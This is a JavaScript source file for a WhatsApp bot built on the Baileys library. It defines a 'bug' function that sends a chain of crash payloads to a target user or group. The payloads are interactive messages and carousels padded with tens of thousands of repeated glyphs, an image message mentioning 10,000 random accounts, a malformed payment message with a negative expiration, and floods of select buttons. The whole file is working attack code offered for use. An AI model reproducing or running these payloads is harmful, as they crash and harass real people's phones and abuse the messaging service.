import { 
    generateWAMessageFromContent, 
    prepareWAMessageMedia, 
    proto 
} from "@whiskeysockets/baileys";
import fs from "fs";

/**
 */
export async function bug(sock, message, target) {
    const remoteJid = target;
    const virus = "ꦾ".repeat(29000);
    const extremeVirus = "𑜦".repeat(20000);
    const randomHex = (len = 16) => [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");

    try {
        // --- Récupération des participants (ex-bug2) ---
        let participants = [];
        if (target.endsWith('@g.us')) {
            const groupMetadata = await sock.groupMetadata(target);
            participants = groupMetadata.participants.map(user => user.id);
        }

        // --- SECTION 1 : INTERACTIVE & BUTTONS FLOOD (FUSION BUG2 & BUG3) ---
        const interactivePayload = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        header: {
                            title: "𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🖤✦",
                            hasMediaAttachment: true,
                            imageMessage: (await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/kyaw5k.jpg" } }, { upload: sock.waUploadToServer })).imageMessage
                        },
                        body: { text: "𝚃𝙾𝙶𝙴-𝙼𝙳-𝚅𝟻 - " + virus.slice(0, 1000) },
                        footer: { text: "🖤" },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: `🖤 ${virus}`, id: "refresh" }) },
                                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: `Love ${virus}`, id: "info" }) },
                                { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: `Te amo ${virus}`, url: "https://togev5.lionelmelo.qzz.io" }) }
                            ]
                        },
                        carouselMessage: {
                            cards: Array.from({ length: 15 }, (_, i) => ({
                                header: { title: "𝚃𝙾𝙶𝙴-𝙼𝙳-𝚅𝟻", hasMediaAttachment: false },
                                body: { text: "vawulence " + i },
                                nativeFlowMessage: {
                                    buttons: [{ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: virus, id: "ID" }) }]
                                }
                            }))
                        }
                    })
                }
            }
        };
        const msgInt = generateWAMessageFromContent(remoteJid, interactivePayload, { quoted: message, mentions: participants });
        await sock.relayMessage(remoteJid, msgInt.message, { messageId: msgInt.key.id });

        // --- SECTION 2 : PROTOCOL & DELAY CRASH (FUSION SUPERDELAY / DELAYCRASH) ---
        const protocolMsg = generateWAMessageFromContent(remoteJid, {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                        mimetype: "image/jpeg",
                        caption: "⏤⃟͟꙳𝐂𝐑𝐀𝐒𝐇͞⃟🖤✦",
                        contextInfo: {
                            mentionedJid: Array.from({ length: 10000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                            remoteJid: "status@broadcast",
                            participant: target,
                            isForwarded: true,
                            forwardingScore: 9999
                        }
                    }
                }
            }
        }, {});
        await sock.relayMessage(remoteJid, protocolMsg.message, { messageId: protocolMsg.key.id });

        // --- SECTION 3 : MASSIVE CAROUSEL X (FUSION CAROUSELX / CAROUSELS2) ---
        let pushCards = [];
        for (let i = 0; i < 100; i++) {
            pushCards.push({
                body: { text: "ㅤ" },
                footer: { text: "ㅤㅤ" },
                header: {
                    title: "⏤⃟͟꙳𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋͞⃟⏤͟͟͞͞͠🖤✦",
                    hasMediaAttachment: true,
                    imageMessage: { url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc" }
                },
                nativeFlowMessage: { buttons: [] }
            });
        }
        const carouselX = generateWAMessageFromContent(remoteJid, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: extremeVirus },
                        carouselMessage: { cards: pushCards, messageVersion: 1 }
                    }
                }
            }
        }, {});
        await sock.relayMessage(remoteJid, carouselX.message, { messageId: carouselX.key.id, participant: { jid: target } });

        // --- SECTION 4 : KCLOSE & PAYMENT METHOD (FUSION KCLOSE) ---
        const paymentMsg = generateWAMessageFromContent(remoteJid, {
            interactiveMessage: {
                messageContextInfo: {
                    messageAssociation: { associationType: 2, parentMessageKey: randomHex(16) },
                    supportPayload: JSON.stringify({
                        version: 2, is_ai_message: true, expiration: -9999,
                        disappearingMode: { initiator: "INITIATED_BY_OTHER", trigger: "ACCOUNT_SETTING" }
                    })
                },
                nativeFlowMessage: {
                    buttons: [{
                        name: "payment_method",
                        buttonParamsJson: JSON.stringify({
                            currency: "IDR",
                            total_amount: { value: 1000000, offset: 100 },
                            order: {
                                status: "canceled",
                                items: [{ name: "KClose Protocol Activation".repeat(100), amount: { value: 1000000, offset: 100 }, quantity: 1000 }]
                            }
                        })
                    }]
                },
                annotations: [{
                    location: { degreesLongitude: 0, degreesLatitude: 0, name: "KClose Anti-Gedor".repeat(100) },
                    newsletter: { newsletterJid: "1@newsletter", newsletterName: "KClose Protocol".repeat(500) }
                }]
            }
        }, { userJid: target });
        await sock.relayMessage(remoteJid, paymentMsg.message, { messageId: paymentMsg.key.id, participant: { jid: target } });

        // --- SECTION 5 : LOCATION & NEWSLETTER FLOOD (FUSION LOC / APAYA) ---
        const locPayload = generateWAMessageFromContent(remoteJid, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "🌍 𝚃𝙾𝙶𝙴-𝙼𝙳-𝚅𝟻 LOC",
                            locationMessage: { degreesLatitude: 0, degreesLongitude: 0, name: "𝚃𝙾𝙶𝙴-𝙼𝙳-𝚅𝟻 Location" },
                            hasMediaAttachment: true
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 10 }, (_, i) => ({
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "⚡ " + "⩺".repeat(500),
                                    sections: [{ title: `Section ${i + 1}`, rows: [{ title: "Click", id: "row_" + i }] }]
                                })
                            }))
                        }
                    }
                }
            }
        }, {});
        await sock.relayMessage(remoteJid, locPayload.message, { messageId: locPayload.key.id });

        console.log("✅ bug envoyée.");

    } catch (err) {
        console.error("❌ Erreur critique dans la fonction bug:", err);
    }
}
